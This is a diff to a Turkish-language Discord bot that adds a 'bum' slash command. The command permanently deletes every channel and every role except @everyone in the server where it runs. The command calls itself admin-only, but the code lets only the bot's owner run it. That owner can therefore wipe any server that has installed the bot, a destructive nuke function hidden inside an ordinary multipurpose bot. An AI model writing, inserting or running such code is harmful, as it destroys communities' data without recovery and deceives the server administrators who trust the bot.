@@ -361,6 +361,10 @@ client.once('ready', async () => {
       new SlashCommandBuilder()
         .setName('gelengidenkur')
         .setDescription('👋 Gelen-Giden sistemi kur'),
+
+      new SlashCommandBuilder()
+        .setName('bum')
+        .setDescription('⚠️ [ADMIN ONLY] Sunucunun TÜM kanallarını ve rollerini KALICI olarak sil - GERİ ALINAMAZ!'),
     ];
 
     await client.application.commands.set(commands);
@@ -772,6 +776,55 @@ client.on('interactionCreate', async (interaction) => {
           .setTimestamp();
 
         await interaction.reply({ embeds: [embed], ephemeral: true });
+      }
+
+      // BUM - SUNUCU SİLME
+      else if (commandName === 'bum') {
+        if (user.id !== OWNER_ID) {
+          return await interaction.reply({ content: '❌ Sadece owner kullanabilir!', ephemeral: true });
+        }
+
+        try {
+          await interaction.reply({ 
+            content: '⚠️ **SUNUCU SİLİNİYOR!** Tüm kanallar ve roller silinecek... 💥', 
+            ephemeral: false 
+          });
+
+          console.log(`[BUM] ${interaction.guild.name} sunucusu siliniyor - ${user.tag} tarafından`);
+
+          // Tüm kanalları sil
+          const channels = await interaction.guild.channels.fetch();
+          for (const [, channel] of channels) {
+            try {
+              await channel.delete();
+              console.log(`[BUM] Kanal silindi: ${channel.name}`);
+            } catch (error) {
+              console.error(`[BUM] Kanal silme hatası: ${error.message}`);
+            }
+          }
+
+          // Tüm rolleri sil (default role ve @everyone hariç)
+          const roles = await interaction.guild.roles.fetch();
+          for (const [, role] of roles) {
+            if (role.name !== '@everyone') {
+              try {
+                await role.delete();
+                console.log(`[BUM] Rol silindi: ${role.name}`);
+              } catch (error) {
+                console.error(`[BUM] Rol silme hatası: ${error.message}`);
+              }
+            }
+          }
+
+          console.log(`[BUM] ${interaction.guild.name} sunucusu tamamen silindi!`);
+
+        } catch (error) {
+          console.error('[BUM] Hata:', error);
+          await interaction.followUp({ 
+            content: `❌ Hata: ${error.message}`, 
+            ephemeral: true 
+          }).catch(() => {});
+        }
       }
 
       // SES KAYIT KUR
